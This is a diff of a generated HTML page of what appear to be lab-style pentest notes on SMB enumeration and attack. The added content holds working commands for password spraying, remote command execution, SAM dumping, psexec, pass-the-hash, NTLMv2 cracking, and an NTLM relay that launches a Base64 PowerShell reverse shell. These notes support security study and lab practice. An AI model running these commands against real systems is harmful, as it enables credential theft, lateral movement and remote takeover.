@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#pass-the-hash-pth" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -806,6 +811,17 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    SMB
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -815,6 +831,50 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-hash-pth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-the-Hash (PtH)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hashcat-for-ntlmv2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hashcat for NTLMv2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impacket-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      impacket-ntlmrelayx
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -1125,6 +1185,26 @@
   
   
     <li class="md-nav__item">
+      <a href="../../passwords/passwords/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Passwords Attack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../pivoting/" class="md-nav__link">
         
   
@@ -1152,10 +1232,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
         
           
-          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1166,8 +1246,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_10">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
             <span class="md-nav__icon md-icon"></span>
             Walkthrough
           </label>
@@ -1256,10 +1336,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
         
           
-          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1270,8 +1350,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_12">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
             <span class="md-nav__icon md-icon"></span>
             Blue
           </label>
@@ -1323,6 +1403,41 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-hash-pth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-the-Hash (PtH)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hashcat-for-ntlmv2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hashcat for NTLMv2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impacket-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      impacket-ntlmrelayx
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -1340,15 +1455,11 @@
 
 <ol>
 <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -sC -p139,445</code></li>
-<li>
-<p>SMBclient
+<li>SMBclient
     <code>bash
     smbclient -N -L //10.129.14.128 # no logon
-    smbclient //10.129.14.128/notes # connecting to share</code></p>
-</li>
-<li>
-<p>Download Files: <code>get file_name</code></p>
-</li>
+    smbclient //10.129.14.128/notes # connecting to share</code></li>
+<li>Download Files: <code>get file_name</code></li>
 <li>Brute Forcing User RIDs: <ol>
 <li>
 <p><code>bash
@@ -1357,7 +1468,14 @@ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(p
 <li>You can use script from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> called <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py">samrdump.py</a> alternatively: <code>samrdump.py 10.129.14.128</code></li>
 </ol>
 </li>
-<li>Crackmapexec: <code>crackmapexec smb 10.129.14.128 --shares -u '' -p ''</code></li>
+<li>Crackmapexec: <ol>
+<li><code>crackmapexec smb 10.129.14.128 --shares -u '' -p ''</code></li>
+<li><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth</code></li>
+<li><code>crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</code></li>
+<li><code>crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</code></li>
+<li><code>crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</code></li>
+</ol>
+</li>
 <li>RPCclient:</li>
 </ol>
 <pre><code class="language-bash">rpcclient -U &quot;&quot; 10.129.14.128
@@ -1371,7 +1489,12 @@ queryuser 0x3e9
 querygroup 0x201
 </code></pre>
 <ol>
-<li>SMBMap: <code>smbmap -H 10.129.14.128</code></li>
+<li>SMBMap:<ol>
+<li><code>smbmap -H 10.129.14.128</code></li>
+<li><code>smbmap -H 10.129.14.128 -r notes</code></li>
+<li><code>smbmap -H 10.129.14.128 --download "notes\note.txt"</code></li>
+</ol>
+</li>
 <li>Enum4Linux:</li>
 </ol>
 <pre><code class="language-bash">git clone https://github.com/cddmp/enum4linux-ng.git
@@ -1381,6 +1504,21 @@ pip3 install -r requirements.txt
 </code></pre>
 <ol>
 <li>HYDRA <code>hydra -L user.list -P password.list smb://10.129.42.197</code></li>
+<li><code>impacket-psexec administrator:'Password123!'@10.10.110.17</code></li>
+</ol>
+<h4 id="pass-the-hash-pth"><strong>Pass-the-Hash (PtH)</strong></h4>
+<ol>
+<li><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></li>
+</ol>
+<h4 id="hashcat-for-ntlmv2"><strong>Hashcat for NTLMv2</strong></h4>
+<ol>
+<li><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></li>
+</ol>
+<h3 id="impacket-ntlmrelayx"><strong>impacket-ntlmrelayx</strong></h3>
+<ol>
+<li>Set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf): <code>cat /etc/responder/Responder.conf | grep 'SMB ='</code></li>
+<li>Execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t: <code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></li>
+<li>Create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).<code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JAB(..))'</code></li>
 </ol>
 
 
